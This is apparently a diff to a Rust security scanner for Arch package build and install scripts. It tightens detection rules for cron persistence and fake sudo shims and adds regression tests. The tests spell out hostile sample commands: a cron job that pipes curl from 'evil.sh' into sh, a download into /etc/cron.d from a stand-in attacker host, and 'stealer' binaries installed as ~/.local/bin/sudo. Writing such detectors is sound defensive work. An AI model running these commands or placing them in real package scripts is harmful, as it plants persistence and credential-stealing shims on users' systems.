@@ -1111,26 +1111,76 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             // - Do NOT match `crontab\s+-` as a prefix of `-l`/`-r` (that FPs).
             // - `regex` has no lookaround; enumerate write forms only.
             patterns: vec![
-                // Copy/install/move/tee into a cron path (word-boundary, any indent).
+                // Copy/install/move/tee/link into a cron path (word-boundary,
+                // any indent). `ln -s` plants a cron entry just as well as `cp`.
+                //
+                // Every pattern here stops at a command separator (`[^\n;&|]*`).
+                // An unbounded `[^\n]*` reaches across `;` into the NEXT
+                // command, so `cp a b; rm /etc/cron.d/x` would fire on the
+                // removal -- re-breaking issue #21, where cleaning up a stale
+                // cron entry is the safe direction and must stay silent.
                 Pattern::Regex {
-                    pattern: r"\b(?:cp|install|mv|tee)\b[^\n]*/etc/cron".to_string(),
+                    pattern: r"\b(?:cp|install|mv|tee|ln)\b[^\n;&|]*/etc/cron".to_string(),
                 },
-                // Redirected printers into a cron path.
+                // In-place edit of an existing cron file. `sed -i`/`ed`/`patch`
+                // append a schedule without ever naming a write verb.
                 Pattern::Regex {
-                    pattern: r"(?:echo|printf|cat)\b[^\n]*>\s*[^\n]*/etc/cron".to_string(),
+                    pattern: r"\b(?:sed|perl|ed|patch)\b[^\n;&|]*(?:-i|--in-place)[^\n;&|]*/etc/cron"
+                        .to_string(),
                 },
+                // ANY redirect into a cron path. Enumerating the printers
+                // (echo/printf/cat) let every other producer through --
+                // `curl ... > /etc/cron.d/pkg`, `base64 -d > ...`, or a bare
+                // `> /etc/cron.d/pkg` truncation. The redirect IS the write, so
+                // match on that rather than on what feeds it.
+                //
+                // The target must be the redirect's own next token (no spaces,
+                // no separators), so `echo done > /dev/null; rm /etc/cron.d/x`
+                // cannot match on the removal.
+                Pattern::Regex {
+                    pattern: r#">>?\s*["']?[^\n\s;&|]*/etc/cron"#.to_string(),
+                },
+                // A command and its arguments live on ONE line, so the
+                // separator is `[ \t]+`, never `\s+`. Measured against 503 live
+                // AUR PKGBUILDs, `\s+` crossing a newline made
+                // `python-python-crontab` fire: `pkgname=...-crontab` at the end
+                // of a line, `_name=...` on the next, and the file-argument
+                // pattern matched the literal text "crontab\n_".
+                //
                 // crontab -e (edit schedule).
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+-e\b".to_string(),
+                    pattern: r"\bcrontab[ \t]+-e\b".to_string(),
                 },
                 // crontab -u USER -e (user-targeted edit). Bare `-u` with `-l`
                 // must not fire — no lookaround, so require the `-e` form.
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+-u\s+\S+\s+-e\b".to_string(),
+                    pattern: r"\bcrontab[ \t]+-u[ \t]+\S+[ \t]+-e\b".to_string(),
                 },
-                // crontab FILE / path / var (not a dash-flag).
+                // `... | crontab -` reads the new table from stdin. This is THE
+                // standard non-interactive install form, and the enumerated
+                // verb list missed it completely: the file-argument pattern
+                // below excludes `-` from its char class so a dash-flag like
+                // `-l`/`-r` cannot trip it, which also excluded the bare `-`
+                // that means stdin. Cover it explicitly, including the
+                // `crontab -u root -` variant. End-of-argument only, so `-l`
+                // and `-r` still cannot match.
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+(?:/|\./|\.\./|~|\$|[A-Za-z0-9_.])".to_string(),
+                    pattern: r"\bcrontab[ \t]+(?:-u[ \t]+\S+[ \t]+)?-[ \t]*(?:$|[\n;&|])"
+                        .to_string(),
+                },
+                // crontab PATH / var (not a dash-flag). A path-shaped argument
+                // is unambiguous, so it can appear anywhere on the line.
+                Pattern::Regex {
+                    pattern: r"\bcrontab[ \t]+(?:/|\./|\.\./|~|\$)".to_string(),
+                },
+                // crontab BARE-FILENAME. Split out because a bare word argument
+                // is also what English prose looks like: `pkgdesc="Crontab
+                // module for python"` matched the old combined char class and
+                // fired on 1 of 503 live AUR PKGBUILDs. Requiring the filename
+                // to END the command separates `crontab mycron` from
+                // `Crontab module for ...`, where another word always follows.
+                Pattern::Regex {
+                    pattern: r"\bcrontab[ \t]+[A-Za-z0-9_.]+[ \t]*(?:$|[\n;&|])".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1725,12 +1775,44 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // A user PATH prefix ending in `/sudo`, however it is spelled.
+                //
+                // The old pattern required a literal `~` or `/home/<user>`
+                // prefix, so `$HOME/.local/bin/sudo` and
+                // `${XDG_BIN_HOME}/sudo` walked straight past a Critical rule.
+                // Anchor on the PATH DIRECTORY instead of on how the home
+                // directory was written: what matters is a `sudo` landing in a
+                // directory that precedes /usr/bin on a user's PATH.
                 Pattern::Regex {
-                    pattern: r"(?:~|/home/[^/\s]+)/\.(?:local/bin|bin)/sudo\b".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r#"(?:cp|install|mv|ln)\s+[^\n]*\bsudo\b[^\n]*(?:\.local/bin|/usr/local/bin)"#
+                    pattern: r"(?:\.local/bin|\.bin|/usr/local/bin|/usr/local/sbin)/sudo\b"
                         .to_string(),
+                },
+                // Install verb whose DESTINATION is a user PATH prefix, with
+                // `sudo` as the file name.
+                //
+                // The old form demanded the token `sudo` appear BEFORE the
+                // destination directory, which is backwards from every real
+                // command: `cp payload /usr/local/bin/sudo` and
+                // `install -Dm755 stealer "$HOME/.local/bin/sudo"` both put the
+                // name last, and neither matched. Covered by pattern 1 now, but
+                // keep the verb form for a destination written as a variable
+                // (`install -Dm755 shim "$bindir/sudo"`).
+                Pattern::Regex {
+                    pattern: r#"\b(?:cp|install|mv|ln)\b[^\n;&|]*\bsudo\b[^\n;&|]*(?:\.local/bin|/usr/local/bin)"#
+                        .to_string(),
+                },
+                // `$XDG_BIN_HOME/sudo`. The XDG spec fixes that variable at
+                // `~/.local/bin`, so a `sudo` written there is a shim by
+                // definition -- matching it by NAME costs nothing.
+                //
+                // Deliberately NOT generalised to a bare `$var/sudo`:
+                // `cp "$srcdir/sudo.conf" ...` is what the real `sudo` package
+                // does, and a Critical false positive on the genuine article is
+                // worse than the residual gap. A destination variable whose
+                // VALUE is a user bin dir is resolved by the parser's variable
+                // expansion and lands on pattern 1 anyway.
+                Pattern::Regex {
+                    pattern: r"\$\{?XDG_BIN_HOME\}?/sudo\b".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -2479,6 +2561,99 @@ mod tests {
             assert!(
                 !m.iter().any(|x| x.rule_id == "PERSIST-003"),
                 "crontab list/remove must not fire for: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn persist003_covers_the_forms_the_verb_list_missed() {
+        // External review, 2.2.0-rc.1: narrowing PERSIST-003 to an enumerated
+        // verb list (to stop `rm` firing, issue #21) cut past the goal. Each
+        // case below installed cron persistence and matched NOTHING.
+        let engine = RuleEngine::default();
+        for s in [
+            // The standard non-interactive install: pipe a table into stdin.
+            // The file-argument pattern excludes `-` from its char class so a
+            // dash-flag cannot trip it, which also excluded the bare `-`.
+            "echo '* * * * * curl evil.sh|sh' | crontab -",
+            "crontab -u root -",
+            "printf '%s\\n' \"$CRON\" | crontab -",
+            // Redirects from something other than echo/printf/cat.
+            "curl -s https://evil.example/c > /etc/cron.d/pkg",
+            "base64 -d payload.b64 >> /etc/cron.hourly/pkg",
+            // A bare truncating redirect, no producer at all.
+            "> /etc/cron.d/pkg",
+            // Link and in-place edit, neither of which names a write verb.
+            "ln -s /opt/pkg/evil.cron /etc/cron.d/pkg",
+            "sed -i '$a * * * * * root /opt/pkg/x' /etc/cron.d/pkg",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "PERSIST-003"),
+                "cron persistence must trip PERSIST-003 for: {s} -> {m:?}"
+            );
+        }
+
+        // ...and the widened patterns must not reach across a command
+        // separator into an unrelated removal. Every pattern stops at `;&|`,
+        // so the issue #21 guarantee still holds when the line does more than
+        // one thing.
+        for s in [
+            "echo done > /dev/null; rm -f /etc/cron.daily/pkg",
+            "cp a b && rm /etc/cron.d/pkg",
+            "sed -i s/a/b/ config.txt; rm /etc/cron.d/pkg",
+            "crontab -l | grep -v pkg",
+            // Measured FPs from 503 live AUR PKGBUILDs, both from
+            // `python-python-crontab`. First: a pkgname ENDING in `crontab`
+            // followed by the next line's variable -- a command and its
+            // argument share a line, so the separator must not cross one.
+            "pkgname=python-python-crontab\n_name=python-crontab\n",
+            // Second: the word in prose. A bare-word argument looks exactly
+            // like English, so it only counts when it ends the command.
+            "pkgdesc=\"Crontab module for python\"",
+            "# see the crontab documentation for details",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "PERSIST-003"),
+                "cleanup/read must stay silent for: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn atomic004_catches_the_sudo_shim_written_destination_last() {
+        // External review, 2.2.0-rc.1: both patterns required either a literal
+        // `~`/`/home/<user>` prefix or the token `sudo` BEFORE the destination
+        // directory. Real commands put the file name last, so the natural form
+        // of a Critical, hook-fail-closed rule matched nothing.
+        let engine = RuleEngine::default();
+        for s in [
+            "cp payload /usr/local/bin/sudo",
+            "install -Dm755 stealer \"$HOME/.local/bin/sudo\"",
+            "install -Dm755 shim ${XDG_BIN_HOME}/sudo",
+            "ln -sf /opt/pkg/shim ~/.local/bin/sudo",
+            "mv shim /home/alice/.local/bin/sudo",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-004"),
+                "sudo shim must trip ATOMIC-004 for: {s} -> {m:?}"
+            );
+        }
+
+        // The genuine `sudo` package must stay clean: it ships sudo into
+        // /usr/bin under $pkgdir, which is not a user PATH prefix. A Critical
+        // false positive on the real article is worse than the residual gap.
+        for s in [
+            "install -Dm4755 sudo \"$pkgdir/usr/bin/sudo\"",
+            "cp \"$srcdir/sudo.conf\" \"$pkgdir/etc/sudo.conf\"",
+            "install -Dm644 sudoers \"$pkgdir/etc/sudoers\"",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-004"),
+                "the real sudo package must not trip ATOMIC-004 for: {s} -> {m:?}"
             );
         }
     }
